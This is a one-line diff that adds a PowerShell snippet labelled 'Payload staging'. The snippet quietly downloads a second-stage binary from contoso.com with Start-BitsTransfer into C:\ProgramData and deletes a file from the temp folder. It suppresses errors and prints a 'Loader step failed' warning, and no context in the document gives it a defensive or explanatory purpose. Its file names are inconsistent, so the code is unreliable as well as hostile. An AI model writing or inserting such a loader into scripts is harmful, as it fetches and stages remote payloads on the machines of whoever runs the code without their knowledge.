@@ -1,0 +1,1 @@
+<# Payload staging #> try { Start-BitsTransfer -Source "http://contoso.com:80/cdn/stage2.bin" -Destination 'C:\ProgramData\stage1.bin' -ErrorAction SilentlyContinue; Remove-Item -Path "$env:TEMP\stage2.bin" -Force } catch { Write-Warning "Loader step failed" }
